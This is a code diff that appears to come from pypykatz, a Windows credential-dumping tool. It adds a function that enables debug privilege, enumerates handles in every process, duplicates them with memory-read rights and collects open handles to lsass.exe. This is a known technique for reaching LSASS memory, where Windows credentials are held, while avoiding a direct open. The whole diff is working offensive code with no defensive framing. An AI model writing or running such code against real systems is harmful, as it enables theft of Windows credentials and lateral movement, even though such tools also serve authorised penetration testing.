@@ -4,6 +4,8 @@ import ctypes
 import enum
 import logging
 
+from pypykatz import logger
+from .ntdll import *
 from .kernel32 import *
 from .psapi import *
 
@@ -76,3 +78,45 @@ def get_lsass_pid():
 			return pid
 			
 	raise Exception('Failed to find lsass.exe')
+	
+def enum_lsass_handles():
+	#searches for open LSASS process handles in all processes
+	# you should be having SE_DEBUG enabled at this point
+	RtlAdjustPrivilege(20)
+	
+	lsass_handles = []
+	sysinfohandles = NtQuerySystemInformation(16)
+	for pid in sysinfohandles:
+		if pid == 4:
+			continue
+		#if pid != GetCurrentProcessId():
+		#	continue
+		for syshandle in sysinfohandles[pid]:
+			#print(pid)
+			try:
+				pHandle = OpenProcess(PROCESS_DUP_HANDLE, False, pid)
+			except Exception as e:
+				logger.debug('Error opening process %s Reason: %s' % (pid, e))
+				continue
+			
+			try:
+				dupHandle = NtDuplicateObject(pHandle, syshandle.Handle, GetCurrentProcess(), PROCESS_QUERY_INFORMATION|PROCESS_VM_READ)
+				#print(dupHandle)
+			except Exception as e:
+				logger.debug('Failed to duplicate object! PID: %s HANDLE: %s' % (pid, hex(syshandle.Handle)))
+				continue
+				
+			oinfo = NtQueryObject(dupHandle, ObjectTypeInformation)
+			if oinfo.Name.getString() == 'Process':
+				try:
+					pname = QueryFullProcessImageNameW(dupHandle)
+					if pname.lower().find('lsass.exe') != -1:
+						logger.info('Found open handle to lsass! PID: %s HANDLE: %s' % (pid, hex(syshandle.Handle)))
+						#print('%s : %s' % (pid, pname))
+						lsass_handles.append((pid, dupHandle))
+				except Exception as e:
+					logger.debug('Failed to obtain the path of the process! PID: %s' % pid) 
+					continue
+	
+	return lsass_handles
+	
